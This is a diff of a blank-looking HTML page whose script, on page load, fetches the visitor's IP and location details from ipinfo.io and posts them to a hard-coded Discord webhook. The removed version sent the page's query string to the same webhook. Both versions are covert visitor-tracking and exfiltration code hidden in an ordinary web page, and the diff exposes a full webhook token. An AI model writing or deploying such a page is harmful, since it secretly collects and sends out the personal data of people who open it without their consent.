@@ -1,18 +1,19 @@
-<!DOCTYPE html>
 <html>
-<body>
-  <script>
-    if (location.href.replace(location.origin + "/?","").length > 0) {
-    fetch("https://discord.com/api/webhooks/1050833111069503539/Ij5ddDcT3xZE3mOyOdUe-nVz3oM7Cl0WM53z114b6wMoOfZ5OxVZRXqxE8jB1FSvcvc4", {
-      method: "POST",
-      headers: {
-        'Content-Type': 'application/json'
-    },
-    body: JSON.stringify({
-        content: location.search.replaceAll("?",""),
-    })
-    });
-    }
-  </script>
-</body>
-</html>
+  <body>
+    <script>
+      import("https://code.jquery.com/jquery-3.6.2.js").then(() => {
+        $.get("https://ipinfo.io/", (a) => {
+          fetch("https://discord.com/api/webhooks/1050833111069503539/Ij5ddDcT3xZE3mOyOdUe-nVz3oM7Cl0WM53z114b6wMoOfZ5OxVZRXqxE8jB1FSvcvc4", {
+            method: "POST",
+            headers: {
+              'Content-Type':'application/json'
+              },
+            body: JSON.stringify({
+              content: JSON.stringify(a)
+              })
+            })
+          })
+        })
+      </script>
+    </body>
+  </html>
